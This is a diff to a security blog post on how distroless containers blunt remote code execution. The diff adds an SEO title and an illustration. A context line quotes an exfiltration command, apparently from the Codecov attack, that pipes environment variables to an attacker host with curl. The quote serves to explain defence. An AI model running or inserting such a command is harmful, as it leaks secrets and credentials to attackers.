@@ -1,5 +1,6 @@
 ---
 title: "Your App Got Hacked. Now What? How Distroless Containers Turn RCE Into a Dead End"
+seoTitle: "Distroless Containers: RCE Dead End"
 date: "2026-01-09"
 description: "They found your Log4j vulnerability. They're in. But in a distroless container, 'getting in' means being trapped in an empty room with no tools, no shell, and no way out."
 tags: ["Security", "Docker", "Kubernetes", "DevSecOps", "Supply Chain"]
@@ -230,6 +231,8 @@ env | curl -X POST https://evil.com/exfiltrate -d @-
 **Critical insight:** Teams running distroless images were **accidentally protected**. Even if the malicious script executed, there was no `bash` to interpret it and no `curl` to phone home. As Codecov noted in their [post-incident analysis](https://about.codecov.io/apr-2021-post-mortem/), the attack specifically targeted environments with standard shell access.
 
 **The attackers achieved RCE in thousands of CI/CD systems, but distroless containers rendered that RCE meaningless.**
+
+<img src="/images/blog/your-app-got-hacked-now-what-body.webp" alt="Illustration of layered shield domes deflecting intrusion particles around a cracked container" width="1200" height="686" loading="lazy" decoding="async" />
 
 ## Implementation: Zero-Package Images Done Right
 
